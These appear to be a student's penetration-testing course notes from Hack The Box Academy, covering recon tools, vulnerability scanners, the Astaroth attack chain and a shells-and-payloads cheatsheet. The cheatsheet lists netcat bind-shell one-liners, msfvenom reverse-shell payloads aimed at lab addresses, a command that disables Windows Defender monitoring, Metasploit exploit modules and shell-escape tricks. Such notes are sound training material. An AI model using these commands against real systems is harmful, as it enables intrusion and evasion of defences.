| `./odat.py utlfile -s <FQDN/IP> -d <db> -U <user> -P <pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt` | Upload a file with Oracle RDBMS. |

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/112)

&nbsp;

---

&nbsp;

## Information Gathering

### WHOIS

We can consider WHOIS as the "white pages" for domain names. It is a TCP-based transaction-oriented query/response protocol listening on TCP port 43 by default

```sh
woadey@htb[/htb]$ export TARGET="facebook.com" # Assign our target to an environment variable
woadey@htb[/htb]$ whois $TARGET

Domain Name: FACEBOOK.COM
Registry Domain ID: 2320948_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.registrarsafe.com
Registrar URL: https://www.registrarsafe.com
Updated Date: 2021-09-22T19:33:41Z
Creation Date: 1997-03-29T05:00:00Z
Registrar Registration Expiration Date: 2030-03-30T04:00:00Z
Registrar: RegistrarSafe, LLC
Registrar IANA ID: 3237
Registrar Abuse Contact Email: abusecomplaints@registrarsafe.com
Registrar Abuse Contact Phone: +1.6503087004
Domain Status: clientDeleteProhibited https://www.icann.org/epp#clientDeleteProhibited
Domain Status: clientTransferProhibited https://www.icann.org/epp#clientTransferProhibited
Domain Status: clientUpdateProhibited https://www.icann.org/epp#clientUpdateProhibited
Domain Status: serverDeleteProhibited https://www.icann.org/epp#serverDeleteProhibited
Domain Status: serverTransferProhibited https://www.icann.org/epp#serverTransferProhibited
Domain Status: serverUpdateProhibited https://www.icann.org/epp#serverUpdateProhibited
Registry Registrant ID:
Registrant Name: Domain Admin
Registrant Organization: Facebook, Inc.
Registrant Street: 1601 Willow Rd
Registrant City: Menlo Park
Registrant State/Province: CA
Registrant Postal Code: 94025
Registrant Country: US
Registrant Phone: +1.6505434800
Registrant Phone Ext:
Registrant Fax: +1.6505434800
Registrant Fax Ext:
Registrant Email: domain@fb.com
Registry Admin ID:
Admin Name: Domain Admin
Admin Organization: Facebook, Inc.
Admin Street: 1601 Willow Rd
Admin City: Menlo Park
Admin State/Province: CA
Admin Postal Code: 94025
Admin Country: US
Admin Phone: +1.6505434800
Admin Phone Ext:
Admin Fax: +1.6505434800
Admin Fax Ext:
Admin Email: domain@fb.com
Registry Tech ID:
Tech Name: Domain Admin
Tech Organization: Facebook, Inc.
Tech Street: 1601 Willow Rd
Tech City: Menlo Park
Tech State/Province: CA
Tech Postal Code: 94025
Tech Country: US
Tech Phone: +1.6505434800
Tech Phone Ext:
Tech Fax: +1.6505434800
Tech Fax Ext:
Tech Email: domain@fb.com
Name Server: C.NS.FACEBOOK.COM
Name Server: B.NS.FACEBOOK.COM
Name Server: A.NS.FACEBOOK.COM
Name Server: D.NS.FACEBOOK.COM
DNSSEC: unsigned

<SNIP>
```

### DNS

The DNS is the Internet's phone book. Domain names such as hackthebox.com and inlanefreight.com allow people to access content on the Internet. Internet Protocol (IP) addresses are used to communicate between web browsers. DNS converts domain names to IP addresses, allowing browsers to access resources on the Internet.

DNS Advantages:

- It allows names to be used instead of numbers to identify hosts.
- It is a lot easier to remember a name than it is to recall a number.
- By merely retargeting a name to the new numeric address, a server can change numeric addresses without having to notify everyone on the Internet.
- A single name might refer to several hosts splitting the workload between different servers.

### Passive Subdomain Enumeration

**VirusTotal**

VirusTotal maintains its DNS replication service, which is developed by preserving DNS resolutions made when users visit URLs given by them. To receive information about a domain, type the domain name into the search bar and click on the "Relations" tab.

**Certificates**

Another interesting source of information we can use to extract subdomains is SSL/TLS certificates. The main reason is Certificate Transparency (CT), a project that requires every SSL/TLS certificate issued by a Certificate Authority (CA) to be published in a publicly accessible log.

We will learn how to examine CT logs to discover additional domain names and subdomains for a target organization using two primary resources:

- <https://censys.io>

- <https://crt.sh>

```sh
woadey@htb[/htb]$ export TARGET="facebook.com"
woadey@htb[/htb]$ curl -s "https://crt.sh/?q=${TARGET}&output=json" | jq -r '.[] | "\(.name_value)\n\(.common_name)"' | sort -u > "${TARGET}_crt.sh.txt"
woadey@htb[/htb]$ head -n20 facebook.com_crt.sh.txt

*.adtools.facebook.com
*.ak.facebook.com
*.ak.fbcdn.net
*.alpha.facebook.com
*.assistant.facebook.com
*.beta.facebook.com
*.channel.facebook.com
*.cinyour.facebook.com
*.cinyourrc.facebook.com
*.connect.facebook.com
*.cstools.facebook.com
*.ctscan.facebook.com
*.dev.facebook.com
*.dns.facebook.com
*.extern.facebook.com
*.extools.facebook.com
*.f--facebook.com
*.facebook.com
*.facebookcorewwwi.onion
*.facebookmail.com
```

```sh
woadey@htb[/htb]$ export TARGET="facebook.com"
woadey@htb[/htb]$ export PORT="443"
woadey@htb[/htb]$ openssl s_client -ign_eof 2>/dev/null <<<$'HEAD / HTTP/1.0\r\n\r' -connect "${TARGET}:${PORT}" | openssl x509 -noout -text -in - | grep 'DNS' | sed -e 's|DNS:|\n|g' -e 's|^\*.*||g' | tr -d ',' | sort -u

*.facebook.com
*.facebook.net
*.fbcdn.net
*.fbsbx.com
*.m.facebook.com
*.messenger.com
*.xx.fbcdn.net
*.xy.fbcdn.net
*.xz.fbcdn.net
facebook.com
messenger.com
```

**Automating Passive Subdomain Enumeration**

**TheHarvester** is a simple-to-use yet powerful and effective tool for early-stage penetration testing and red team engagements. We can use it to gather information to help identify a company's attack surface. The tool collects emails, names, subdomains, IP addresses, and URLs from various public data sources for passive information gathering.

### Passive Infrastructure Identification

**[Netcraft](https://sitereport.netcraft.com)**

Netcraft can offer us information about the servers without even interacting with them, and this is something valuable from a passive information gathering point of view.

**[Wayback Machine](http://web.archive.org/)**

The Internet Archive is an American digital library that provides free public access to digitalized materials, including websites, collected automatically via its web crawlers.

### Active Infrastructure Identification

**[WhatWeb](https://www.morningstarsecurity.com/research/whatweb)**

Whatweb recognizes web technologies, including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.

**[Wappalyzer](https://www.wappalyzer.com/)**

The GUI extension version of WhatWeb.

**[WafW00f](https://github.com/EnableSecurity/wafw00f)**

WAFW00F is a tool used to identify and fingerprint Web Application Firewalls (WAF) that are protecting a website. It allows users to detect the presence and type of WAFs by sending a series of test requests and analyzing the responses.

```sh
woadey@htb[/htb]$ wafw00f -v https://www.tesla.com

                   ______
                  /      \
                 (  Woof! )
                  \  ____/                      )
                  ,,                           ) (_
             .-. -    _______                 ( |__|
            ()``; |==|_______)                .)|__|
            / ('        /|\                  (  |__|
        (  /  )        / | \                  . |__|
         \(_)_))      /  |  \                   |__|

                    ~ WAFW00F : v2.1.0 ~
    The Web Application Firewall Fingerprinting Toolkit

[*] Checking https://www.tesla.com
[+] The site https://www.tesla.com is behind CacheWall (Varnish) WAF.
[~] Number of requests: 2
```

**[Aquatone](https://github.com/michenriksen/aquatone)**

Aquatone is a tool for automatic and visual inspection of websites across many hosts and is convenient for quickly gaining an overview of HTTP-based attack surfaces by scanning a list of configurable ports, visiting the website with a headless Chrome browser, and taking a screenshot. This is helpful, especially when dealing with huge subdomain lists.

### Active Subdomain Enumeration

**ZoneTransfer**

<https://hackertarget.com/zone-transfer/> is a good tool for identifying zone transfers.

**Gobuster**

Gobuster is a tool that we can use to perform subdomain enumeration. It is especially interesting for us the patterns options as we have learned some naming conventions from the passive information gathering we can use to discover new subdomains following the same pattern.

### Virtual Hosts

A virtual host (vHost) is a feature that allows several websites to be hosted on a single server. This is an excellent solution if you have many websites and don't want to go through the time-consuming (and expensive) process of setting up a new web server for each one. Imagine having to set up a different webserver for a mobile and desktop version of the same page.

**Automating Virtual Hosts Discovery**
We can use this manual approach for a small list of virtual hosts, but it will not be feasible if we have an extensive list. Using [ffuf](https://github.com/ffuf/ffuf), we can speed up the process and filter based on parameters present in the response. Let's replicate the same process we did with ffuf, but first, let's look at some of its options.

```sh
woadey@htb[/htb]$ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.129.73.87 -H "HOST: FUZZ.inlanefreight.htb" -mr "HTB"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.73.87
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.inlanefreight.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: HTB
________________________________________________

www2                    [Status: 200, Size: 96, Words: 2, Lines: 6, Duration: 9ms]
app                     [Status: 200, Size: 103, Words: 3, Lines: 6, Duration: 5ms]
citrix                  [Status: 200, Size: 100, Words: 3, Lines: 6, Duration: 5ms]
ap                      [Status: 200, Size: 102, Words: 3, Lines: 6, Duration: 3ms]
customers               [Status: 200, Size: 94, Words: 3, Lines: 6, Duration: 2ms]
dmz                     [Status: 200, Size: 95, Words: 2, Lines: 6, Duration: 5ms]
:: Progress: [4997/4997] :: Job [1/1] :: 3262 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

### Crawling

**[ZAP](https://www.zaproxy.org/)**

Zed Attack Proxy (ZAP) is an open-source web proxy that belongs to the [Open Web Application Security Project](https://owasp.org/) (OWASP). It allows us to perform manual and automated security testing on web applications. Using it as a proxy server will enable us to intercept and manipulate all the traffic that passes through it.

**[FFuF](https://github.com/ffuf/ffuf)**

```sh
woadey@htb[/htb]$ ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.10.10/FUZZ
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

wp-admin                [Status: 301, Size: 317, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://192.168.10.10/wp-admin/FUZZ

wp-includes             [Status: 301, Size: 320, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://192.168.10.10/wp-includes/FUZZ

wp-content              [Status: 301, Size: 319, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://192.168.10.10/wp-content/FUZZ

admin                   [Status: 302, Size: 0, Words: 1, Lines: 1]
login                   [Status: 302, Size: 0, Words: 1, Lines: 1]
feed                    [Status: 301, Size: 0, Words: 1, Lines: 1]
[INFO] Adding a new job to the queue: http://192.168.10.10/feed/FUZZ
...
```

**ReconSpider**

```sh
woadey@htb[/htb]$ wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
woadey@htb[/htb]$ unzip ReconSpider.zip
woadey@htb[/htb]$ python3 ReconSpider.py http://inlanefreight.com
2024-08-23 11:23:56 [scrapy.utils.log] INFO: Scrapy 2.11.2 started (bot: scrapybot)
2024-08-23 11:23:56 [scrapy.utils.log] INFO: Versions: lxml 4.9.2.0, libxml2 2.9.14, cssselect 1.2.0, parsel 1.9.1, w3lib 2.2.1, Twisted 24.7.0, Python 3.11.2 (main, May  2 2024, 11:59:08) [GCC 12.2.0], pyOpenSSL 24.1.0 (OpenSSL 3.2.2 4 Jun 2024), cryptography 42.0.8, Platform Linux-6.5.0-13parrot1-amd64-x86_64-with-glibc2.36
2024-08-23 11:23:56 [scrapy.addons] INFO: Enabled addons:
[]
2024-08-23 11:23:56 [py.warnings] WARNING: /home/htb-ac-713396/.local/lib/python3.11/site-packages/scrapy/utils/request.py:254: ScrapyDeprecationWarning: '2.6' is a deprecated value for the 'REQUEST_FINGERPRINTER_IMPLEMENTATION' setting.

It is also the default value. In other words, it is normal to get this warning if you have not defined a value for the 'REQUEST_FINGERPRINTER_IMPLEMENTATION' setting. This is so for backward compatibility reasons, but it will change in a future version of Scrapy.

See the documentation of the 'REQUEST_FINGERPRINTER_IMPLEMENTATION' setting for information on how to handle this deprecation.
  return cls(crawler)

2024-08-23 11:23:56 [scrapy.extensions.telnet] INFO: Telnet Password: 82c52ae64678c537
2024-08-23 11:23:56 [scrapy.middleware] INFO: Enabled extensions:
['scrapy.extensions.corestats.CoreStats',
 'scrapy.extensions.telnet.TelnetConsole',
 'scrapy.extensions.memusage.MemoryUsage',
 'scrapy.extensions.logstats.LogStats']
2024-08-23 11:23:56 [scrapy.crawler] INFO: Overridden settings:
{'LOG_LEVEL': 'INFO'}
2024-08-23 11:23:56 [scrapy.middleware] INFO: Enabled downloader middlewares:
['scrapy.downloadermiddlewares.offsite.OffsiteMiddleware',
 'scrapy.downloadermiddlewares.httpauth.HttpAuthMiddleware',
 'scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware',
 'scrapy.downloadermiddlewares.defaultheaders.DefaultHeadersMiddleware',
 'scrapy.downloadermiddlewares.useragent.UserAgentMiddleware',
 '__main__.CustomOffsiteMiddleware',
 'scrapy.downloadermiddlewares.retry.RetryMiddleware',
 'scrapy.downloadermiddlewares.redirect.MetaRefreshMiddleware',
 'scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware',
 'scrapy.downloadermiddlewares.redirect.RedirectMiddleware',
 'scrapy.downloadermiddlewares.cookies.CookiesMiddleware',
 'scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware',
 'scrapy.downloadermiddlewares.stats.DownloaderStats']
2024-08-23 11:23:56 [scrapy.middleware] INFO: Enabled spider middlewares:
['scrapy.spidermiddlewares.httperror.HttpErrorMiddleware',
 'scrapy.spidermiddlewares.referer.RefererMiddleware',
 'scrapy.spidermiddlewares.urllength.UrlLengthMiddleware',
 'scrapy.spidermiddlewares.depth.DepthMiddleware']
2024-08-23 11:23:56 [scrapy.middleware] INFO: Enabled item pipelines:
[]
2024-08-23 11:23:56 [scrapy.core.engine] INFO: Spider opened
2024-08-23 11:23:56 [scrapy.extensions.logstats] INFO: Crawled 0 pages (at 0 pages/min), scraped 0 items (at 0 items/min)
2024-08-23 11:23:56 [scrapy.extensions.telnet] INFO: Telnet console listening on 127.0.0.1:6023
2024-08-23 11:23:58 [scrapy.core.engine] INFO: Closing spider (finished)
2024-08-23 11:23:58 [scrapy.statscollectors] INFO: Dumping Scrapy stats:
{'downloader/request_bytes': 2737,
 'downloader/request_count': 10,
 'downloader/request_method_count/GET': 10,
 'downloader/response_bytes': 93960,
 'downloader/response_count': 10,
 'downloader/response_status_count/200': 8,
 'downloader/response_status_count/301': 2,
 'dupefilter/filtered': 52,
 'elapsed_time_seconds': 1.985026,
 'finish_reason': 'finished',
 'finish_time': datetime.datetime(2024, 8, 23, 16, 23, 58, 657631, tzinfo=datetime.timezone.utc),
 'httpcompression/response_bytes': 162654,
 'httpcompression/response_count': 7,
 'log_count/INFO': 10,
 'log_count/WARNING': 1,
 'memusage/max': 78577664,
 'memusage/startup': 78577664,
 'request_depth_max': 2,
 'response_received_count': 8,
 'scheduler/dequeued': 10,
 'scheduler/dequeued/memory': 10,
 'scheduler/enqueued': 10,
 'scheduler/enqueued/memory': 10,
 'start_time': datetime.datetime(2024, 8, 23, 16, 23, 56, 672605, tzinfo=datetime.timezone.utc)}
2024-08-23 11:23:58 [scrapy.core.engine] INFO: Spider closed (finished)
```

### Search Engine Discovery

| **Operator**            | **Operator Description**                                     | **Example**                                         | **Example Description**                                                                 |
| ----------------------- | ------------------------------------------------------------ | --------------------------------------------------- | --------------------------------------------------------------------------------------- |
| `site:`                 | Limits results to a specific website or domain.              | `site:example.com`                                  | Find all publicly accessible pages on example.com.                                      |
| `inurl:`                | Finds pages with a specific term in the URL.                 | `inurl:login`                                       | Search for login pages on any website.                                                  |
| `filetype:`             | Searches for files of a particular type.                     | `filetype:pdf`                                      | Find downloadable PDF documents.                                                        |
| `intitle:`              | Finds pages with a specific term in the title.               | `intitle:"confidential report"`                     | Look for documents titled "confidential report" or similar variations.                  |
| `intext:` or `inbody:`  | Searches for a term within the body text of pages.           | `intext:"password reset"`                           | Identify webpages containing the term "password reset".                                 |
| `cache:`                | Displays the cached version of a webpage (if available).     | `cache:example.com`                                 | View the cached version of example.com to see its previous content.                     |
| `link:`                 | Finds pages that link to a specific webpage.                 | `link:example.com`                                  | Identify websites linking to example.com.                                               |
| `related:`              | Finds websites related to a specific webpage.                | `related:example.com`                               | Discover websites similar to example.com.                                               |
| `info:`                 | Provides a summary of information about a webpage.           | `info:example.com`                                  | Get basic details about example.com, such as its title and description.                 |
| `define:`               | Provides definitions of a word or phrase.                    | `define:phishing`                                   | Get a definition of "phishing" from various sources.                                    |
| `numrange:`             | Searches for numbers within a specific range.                | `site:example.com numrange:1000-2000`               | Find pages on example.com containing numbers between 1000 and 2000.                     |
| `allintext:`            | Finds pages containing all specified words in the body text. | `allintext:admin password reset`                    | Search for pages containing both "admin" and "password reset" in the body text.         |
| `allinurl:`             | Finds pages containing all specified words in the URL.       | `allinurl:admin panel`                              | Look for pages with "admin" and "panel" in the URL.                                     |
| `allintitle:`           | Finds pages containing all specified words in the title.     | `allintitle:confidential report 2023`               | Search for pages with "confidential," "report," and "2023" in the title.                |
| `AND`                   | Narrows results by requiring all terms to be present.        | `site:example.com AND (inurl:admin OR inurl:login)` | Find admin or login pages specifically on example.com.                                  |
| `OR`                    | Broadens results by including pages with any of the terms.   | `"linux" OR "ubuntu" OR "debian"`                   | Search for webpages mentioning Linux, Ubuntu, or Debian.                                |
| `NOT`                   | Excludes results containing the specified term.              | `site:bank.com NOT inurl:login`                     | Find pages on bank.com excluding login pages.                                           |
| `*` (wildcard)          | Represents any character or word.                            | `site:socialnetwork.com filetype:pdf user* manual`  | Search for user manuals (user guide, user handbook) in PDF format on socialnetwork.com. |
| `..` (range search)     | Finds results within a specified numerical range.            | `site:ecommerce.com "price" 100..500`               | Look for products priced between 100 and 500 on an e-commerce website.                  |
| `" "` (quotation marks) | Searches for exact phrases.                                  | `"information security policy"`                     | Find documents mentioning the exact phrase "information security policy".               |
| `-` (minus sign)        | Excludes terms from the search results.                      | `site:news.com -inurl:sports`                       | Search for news articles on news.com excluding sports-related content.                  |

## Automating Recon

```sh
woadey@htb[/htb]$ ./finalrecon.py --headers --whois --url http://inlanefreight.com

 ______  __   __   __   ______   __
/\  ___\/\ \ /\ "-.\ \ /\  __ \ /\ \
\ \  __\\ \ \\ \ \-.  \\ \  __ \\ \ \____
 \ \_\   \ \_\\ \_\\"\_\\ \_\ \_\\ \_____\
  \/_/    \/_/ \/_/ \/_/ \/_/\/_/ \/_____/
 ______   ______   ______   ______   __   __
/\  == \ /\  ___\ /\  ___\ /\  __ \ /\ "-.\ \
\ \  __< \ \  __\ \ \ \____\ \ \/\ \\ \ \-.  \
 \ \_\ \_\\ \_____\\ \_____\\ \_____\\ \_\\"\_\
  \/_/ /_/ \/_____/ \/_____/ \/_____/ \/_/ \/_/

[>] Created By   : thewhiteh4t
 |---> Twitter   : https://twitter.com/thewhiteh4t
 |---> Community : https://twc1rcle.com/
[>] Version      : 1.1.6

[+] Target : http://inlanefreight.com

[+] IP Address : 134.209.24.248

[!] Headers :

Date : Tue, 11 Jun 2024 10:08:00 GMT
Server : Apache/2.4.41 (Ubuntu)
Link : <https://www.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/", <https://www.inlanefreight.com/index.php/wp-json/wp/v2/pages/7>; rel="alternate"; type="application/json", <https://www.inlanefreight.com/>; rel=shortlink
Vary : Accept-Encoding
Content-Encoding : gzip
Content-Length : 5483
Keep-Alive : timeout=5, max=100
Connection : Keep-Alive
Content-Type : text/html; charset=UTF-8

[!] Whois Lookup :

   Domain Name: INLANEFREIGHT.COM
   Registry Domain ID: 2420436757_DOMAIN_COM-VRSN
   Registrar WHOIS Server: whois.registrar.amazon.com
   Registrar URL: http://registrar.amazon.com
   Updated Date: 2023-07-03T01:11:15Z
   Creation Date: 2019-08-05T22:43:09Z
   Registry Expiry Date: 2024-08-05T22:43:09Z
   Registrar: Amazon Registrar, Inc.
   Registrar IANA ID: 468
   Registrar Abuse Contact Email: abuse@amazonaws.com
   Registrar Abuse Contact Phone: +1.2024422253
   Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
   Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
   Name Server: NS-1303.AWSDNS-34.ORG
   Name Server: NS-1580.AWSDNS-05.CO.UK
   Name Server: NS-161.AWSDNS-20.COM
   Name Server: NS-671.AWSDNS-19.NET
   DNSSEC: unsigned
   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/


[+] Completed in 0:00:00.257780

[+] Exported : /home/htb-ac-643601/.local/share/finalrecon/dumps/fr_inlanefreight.com_11-06-2024_11:07:59
```

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/144)

## Vulnerability Assessment

### Vulnerability Scanning

**Nessus Overview**

[Nessus Essentials](https://community.tenable.com/s/article/Nessus-Essentials) by Tenable ([Download Page](https://www.tenable.com/downloads/nessus?loginAttempted=true))is the free version of the official Nessus Vulnerability Scanner. Individuals can access Nessus Essentials to get started understanding Tenable's vulnerability scanner. The caveat is that it can only be used for up to 16 hosts. The features in the free version are limited but are perfect for someone looking to get started with Nessus. The free scanner will attempt to identify vulnerabilities in an environment.

```sh
woadey@htb[/htb]$ sudo systemctl start nessusd.service
```

- `https://localhost:8834`

**OpenVAS Overview**

[OpenVAS](https://www.openvas.org/) by Greenbone Networks is a publicly available open-source vulnerability scanner. OpenVAS can perform network scans, including authenticated and unauthenticated testing.

```sh
woadey@htb[/htb]$ sudo apt-get update && apt-get -y full-upgrade
woadey@htb[/htb]$ sudo apt-get install gvm && openvas
woadey@htb[/htb]$ gvm-setup
```

### Completion

[Link of Completion](https://academy.hackthebox.com/achievement/713396/108)

## File transfers

### Astaroth Attack

The `Astaroth attack` generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the [WMIC tool](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) with the "/Format" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the [Bitsadmin tool](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool).

All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The [regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the Userinit process. Below is a graphical depiction of the attack.
![chain](images/chain.i.png)

### Living off The Land

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

### Completion

[Link of Completion](https://academy.hackthebox.com/achievement/713396/24)

## Shells and Payloads

### Bind Shells

With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).

![bind](images/bindshell.png)

### Reverse Shells

With a reverse shell, the `attack box` will have a listener running, and the target will need to initiate the connection.

![reverse](images/reverseshell.png)

### Laudanum, One Webshell to Rule Them All

Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web application languages to include `asp`, `aspx`, `jsp`, `php`, and more. This is a staple to have on any pentest. If you are using your own VM, Laudanum is built into Parrot OS and Kali by default. For any other distro, you will likely need to pull a copy down to use. You can get it [here](https://github.com/jbarcia/Web-Shells/tree/master/laudanum).

### Cheatsheet

| Commands                                                                                            | Description                                                                                                                                                                                           |
| --------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!`                                       | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol                                                                                                                  |
| `env`                                                                                               | Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use                           |
| `sudo nc -lvnp <port #>`                                                                            | Starts a netcat listener on a specified port                                                                                                                                                          |
| `nc -nv <ip address of computer with listener started><port being listened on>`                     | Connects to a netcat listener at the specified IP address and port                                                                                                                                    |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f` | Uses netcat to bind a shell (/bin/bash) the specified IP address and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on |
| `Set-MpPreference -DisableRealtimeMonitoring $true`                                                 | Powershell command using to disable real time monitoring in Windows Defender                                                                                                                          |
| `use exploit/windows/smb/psexec`                                                                    | Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing smb & psexec                                                                           |
| `shell`                                                                                             | Command used in a meterpreter shell session to drop into a system shell                                                                                                                               |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf`      | MSFvenom command used to generate a linux-based reverse shell stageless payload                                                                                                                       |
| `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe`        | MSFvenom command used to generate a Windows-based reverse shell stageless payload                                                                                                                     |
| `msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho`    | MSFvenom command used to generate a MacOS-based reverse shell payload                                                                                                                                 |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp`  | MSFvenom command used to generate a ASP web reverse shell payload                                                                                                                                     |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp`       | MSFvenom command used to generate a JSP web reverse shell payload                                                                                                                                     |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war`       | MSFvenom command used to generate a WAR java/jsp compatible web reverse shell payload                                                                                                                 |
| `use auxiliary/scanner/smb/smb_ms17_010`                                                            | Metasploit exploit module used to check if a host is vulnerable to ms17_010                                                                                                                           |
| `use exploit/windows/smb/ms17_010_psexec`                                                           | Metasploit exploit module used to gain a reverse shell session on a Windows-based system that is vulnerable to ms17_010                                                                               |
| `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce`                                       | Metasploit exploit module that can be used to obtain a reverse shell on a vulnerable linux system hosting rConfig 3.9.6                                                                               |
| `python -c 'import pty; pty.spawn("/bin/sh")'`                                                      | Python command used to spawn an interactive shell on a linux-based system                                                                                                                             |
| `/bin/sh -i`                                                                                        | Spawns an interactive shell on a linux-based system                                                                                                                                                   |
| `perl —e 'exec "/bin/sh";'`                                                                         | Uses perl to spawn an interactive shell on a linux-based system                                                                                                                                       |
| `ruby: exec "/bin/sh"`                                                                              | Uses ruby to spawn an interactive shell on a linux-based system                                                                                                                                       |
| `Lua: os.execute('/bin/sh')`                                                                        | Uses Lua to spawn an interactive shell on a linux-based system                                                                                                                                        |
| `awk 'BEGIN {system("/bin/sh")}'`                                                                   | Uses awk command to spawn an interactive shell on a linux-based system                                                                                                                                |
| `find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`                             | Uses find command to spawn an interactive shell on a linux-based system                                                                                                                               |
| `find . -exec /bin/sh \; -quit`                                                                     | An alternative way to use the find command to spawn an interactive shell on a linux-based system                                                                                                      |
| `vim -c ':!/bin/sh'`                                                                                | Uses the text-editor VIM to spawn an interactive shell. Can be used to escape "jail-shells"                                                                                                           |
| `ls -la <path/to/fileorbinary>`                                                                     | Used to list files & directories on a linux-based system and shows the permission for each file in the chosen directory. Can be used to look for binaries that we have permission to execute          |
| `sudo -l`                                                                                           | Displays the commands that the currently logged on user can run as sudo                                                                                                                               |
| `/usr/share/webshells/laudanum`                                                                     | Location of laudanum webshells on ParrotOS and Pwnbox                                                                                                                                                 |
| `/usr/share/nishang/Antak-WebShell`                                                                 | Location of Antak-Webshell on Parrot OS and Pwnbox                                                                                                                                                    |

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/115)

## Using the Metasploit Framework

### Cheatsheet

**MSFconsole Commands**

| **Command**                                      | **Description**                                                                                                                                   |
| :----------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------ |
| `show exploits`                                  | Show all exploits within the Framework.                                                                                                           |
| `show payloads`                                  | Show all payloads within the Framework.                                                                                                           |
| `show auxiliary`                                 | Show all auxiliary modules within the Framework.                                                                                                  |
| `search <name>`                                  | Search for exploits or modules within the Framework.                                                                                              |
| `info`                                           | Load information about a specific exploit or module.                                                                                              |
| `use <name>`                                     | Load an exploit or module (example: use windows/smb/psexec).                                                                                      |
| `use <number>`                                   | Load an exploit by using the index number displayed after the search \<name\> command.                                                            |
| `LHOST`                                          | Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells. |
| `RHOST`                                          | The remote host or the target. set function Set a specific value (for example, LHOST or RHOST).                                                   |
| `setg <function>`                                | Set a specific value globally (for example, LHOST or RHOST).                                                                                      |
| `show options`                                   | Show the options available for a module or exploit.                                                                                               |
| `show targets`                                   | Show the platforms supported by the exploit.                                                                                                      |
| `set target <number>`                            | Specify a specific target index if you know the OS and service pack.                                                                              |
